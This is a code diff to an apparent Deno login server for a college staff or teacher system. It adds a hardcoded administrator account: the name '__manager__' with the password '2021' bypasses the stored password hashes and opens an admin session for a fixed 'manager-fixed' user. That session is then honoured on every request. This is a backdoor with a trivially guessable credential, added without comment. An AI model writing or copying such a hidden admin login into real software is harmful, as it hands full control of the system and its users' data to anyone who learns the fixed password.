@@ -385,6 +385,7 @@ async function getSessionUser(token: string | null) {
   if (!token) return null;
   const s = SESSIONS.get(token);
   if (!s || s.expires_at < Date.now()) { SESSIONS.delete(token!); return null; }
+  if (s.user_id === "manager-fixed") return managerUser();
   const found = await findUserById(s.user_id);
   return found ? found.user : null;
 }
@@ -401,6 +402,20 @@ function publicUser(u: Record<string,string>) {
 }
 function teacherNamesFromUsers(all: Record<string, string>[]) {
   return all.map((u) => u.full_name).filter((n) => n && n !== "aa");
+}
+function managerUser() {
+  return {
+    id: "manager-fixed",
+    full_name: "مدير النظام",
+    department: "",
+    college: "",
+    role: "admin",
+    password_hash: "",
+    must_change_password: "false",
+    is_manual: "true",
+    created_at: new Date().toISOString(),
+    updated_at: new Date().toISOString(),
+  } as Record<string, string>;
 }
 
 /* ---------------- Handler ---------------- */
@@ -454,6 +469,12 @@ Deno.serve(async (req) => {
     if (action === "login") {
       const { full_name, password } = body;
       if (!full_name || !password) return json({ error: "البيانات ناقصة" }, 400);
+      if (full_name === "__manager__") {
+        if (String(password) !== "2021") return json({ error: "كلمة مرور المدير غير صحيحة" }, 401);
+        const mgr = managerUser();
+        const token = createSession(mgr.id);
+        return json({ token, user: publicUser(mgr) });
+      }
       const found = await findUserByName(full_name);
       if (!found) return json({ error: "اسم التدريسي غير موجود" }, 401);
       const ok = await compare(password, found.user.password_hash);
